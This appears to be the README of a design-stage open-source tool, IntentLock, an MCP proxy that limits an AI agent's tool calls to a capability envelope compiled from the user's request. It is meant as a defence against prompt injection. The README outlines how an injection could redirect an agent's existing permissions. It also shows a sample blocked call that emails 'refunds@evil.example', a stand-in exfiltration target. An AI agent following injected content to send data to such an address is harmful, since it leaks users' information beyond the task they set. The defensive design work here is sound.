<div align="center">

# IntentLock

<h3>Tool calls limited to what the user asked for</h3>

[![Status](https://img.shields.io/badge/status-design%20stage-orange?style=flat-square)](ROADMAP.md)
[![Go 1.26+](https://img.shields.io/badge/go-1.26+-00ADD8?style=flat-square)](https://go.dev/dl/)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue?style=flat-square)](LICENSE)

---

[How it works](#how-it-works) · [Thesis](THESIS.md) · [Roadmap](ROADMAP.md) · [Contributing](CONTRIBUTING.md) · [Security](SECURITY.md)

</div>

---

## What is IntentLock?

Tool calls limited to what the user actually asked for. At the start of a
task, `intentlock` turns the user's request into a capability envelope: the
tools the agent may call, the argument values they may take, and the
recipients and paths they may touch. An MCP proxy enforces the envelope, so a
prompt injection that tries to widen the task is blocked before the call runs.

> **Status: design stage.** There is no code yet. The envelope format,
> commands and output below are the proposal, and they will change. Part of
> the [OpenAstra](https://openastra.org) research agenda, area VIII: AI
> Runtime Security.

---

## The problem

Agents get standing permissions: a support agent can refund *any* order and
email *anyone*, because some task might need it. A prompt injection doesn't
need new permissions; it only needs to redirect the ones the agent already
has. Static allowlists can't help, because the right scope depends on the
request in front of the agent right now.

---

## How it works

1. **Capture intent.** When a task starts, take the user's request (not
   content the agent later reads) as the source of truth.
2. **Compile an envelope.** Derive the allowed tools and argument constraints.
   Simple requests compile with rules; ambiguous ones are shown to the user to
   confirm. Example: "Refund order #4411" becomes
   `refund(order_id = 4411, amount <= original_amount)`.
3. **Enforce at the proxy.** `intentlock` sits between the agent and its MCP
   servers. Every call is checked against the envelope: allowed, blocked, or
   held for approval.
4. **Widen explicitly.** If the agent genuinely needs more, it asks, and the
   user approves a new envelope. Content the agent read can never widen it.

---

## Example (proposed)

```yaml
# envelope compiled from: "Refund order #4411 and let the customer know"
task: t-81c2
allow:
  - tool: orders.refund
    args: { order_id: 4411, amount: { max: $order.4411.total } }
  - tool: email.send
    args: { to: $order.4411.customer_email, max_count: 1 }
deny_by_default: true
```

```console
BLOCKED  email.send(to="refunds@evil.example")
         recipient is outside the envelope for task t-81c2
         envelope allows: customer of order 4411
```

---

## Planned surfaces

- MCP proxy (stdio and HTTP) that wraps existing servers with no changes to them
- Envelope compiler: rules first, with an optional model-assisted mode that always asks the user to confirm
- Policy hooks in [OpenGPL](https://github.com/sadayamuthu/opengpl), so organizations can set limits no envelope may exceed
- Audit log of every envelope, call and decision

---

## Maps to

| Framework | Items |
|-----------|-------|
| OWASP LLM Top 10 (2025) | LLM01 Prompt Injection, LLM06 Excessive Agency |
| OWASP Agentic Top 10 | Goal hijack, tool misuse |
| NIST SP 800-53 Rev. 5 | AC-3 Access Enforcement, AC-6 Least Privilege |

---

## Design principles

- **The user's words set the scope; retrieved content never does.**
- **Deny by default** inside an envelope.
- **Fail closed** when the envelope can't be compiled: ask, don't guess.

---

## Roadmap

The plan, from the first working version to 1.0, is in [ROADMAP.md](ROADMAP.md). The reasoning behind the project, and what would make us stop, is in [THESIS.md](THESIS.md).

---

## Built on switchyard

`intentlock` will be a Go binary built on [switchyard](https://github.com/sadayamuthu/switchyard), OpenAstra's shared MCP proxy core: envelope enforcement is a switchyard hook that blocks `tools/call` requests outside the envelope. It stacks with the other switchyard tools by chaining (`agent → fuse → intentlock → taintline → rewind → MCP server`).

---

## Related OpenAstra projects

- [Unasked](https://github.com/sadayamuthu/unasked): the same idea after the fact, for code edits
- [Taintline](https://github.com/sadayamuthu/taintline): tracks *which content* is trying to make a call
- AgentID (in the lab): the identity an envelope is issued to

---

## Contributing

Design feedback, real-world cases and fixes are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for how to help while the project is at the design stage, and [GOVERNANCE.md](GOVERNANCE.md) for how decisions are made.

---

## Security

Please report vulnerabilities privately through [GitHub security advisories](https://github.com/sadayamuthu/intentlock/security/advisories/new), not in a public issue. See [SECURITY.md](SECURITY.md) for what to include and what's in scope.

---

## License

[Apache License 2.0](LICENSE)

---

<div align="center">

**IntentLock: tool calls limited to what the user asked for**

IntentLock is managed by [OpenAstra](https://openastra.org)

[GitHub](https://github.com/sadayamuthu/intentlock) · [Thesis](THESIS.md) · [Roadmap](ROADMAP.md)

</div>
